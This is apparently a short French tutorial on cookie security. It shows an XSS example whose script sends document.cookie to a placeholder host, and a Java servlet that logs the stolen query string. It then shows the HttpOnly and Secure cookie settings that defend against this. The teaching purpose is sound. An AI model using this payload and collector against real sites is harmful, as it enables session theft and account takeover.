# Securite Cookies



### Exemple d'utilisation de faille XSS 


```
// Javascript
<script>
xhr=new XMLHttpRequest();
xhr.open("GET", "//URL:8080/project/doSomething?data="+encodeURI(document.cookie), true);
xhr.send();
</script>
```

```
// Java Servlet
@WebServlet("/cat")
public class Cat extends HttpServlet {

	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		System.out.println(request.getRequestURL()+"?" + request.getQueryString());		
	}
}
```

### Quelques solutions
Activer les option HttpOnly et Secure.

```
// Par exemple dans la servlet
Cookie cookie = new Cookie("userName", name);
cookie.setHttpOnly(true);
response.addCookie(cookie);
```

```
// Dans le web.xml
<session-config>
	<cookie-config>
		<secure>true</secure>
	</cookie-config>
</session-config>
```





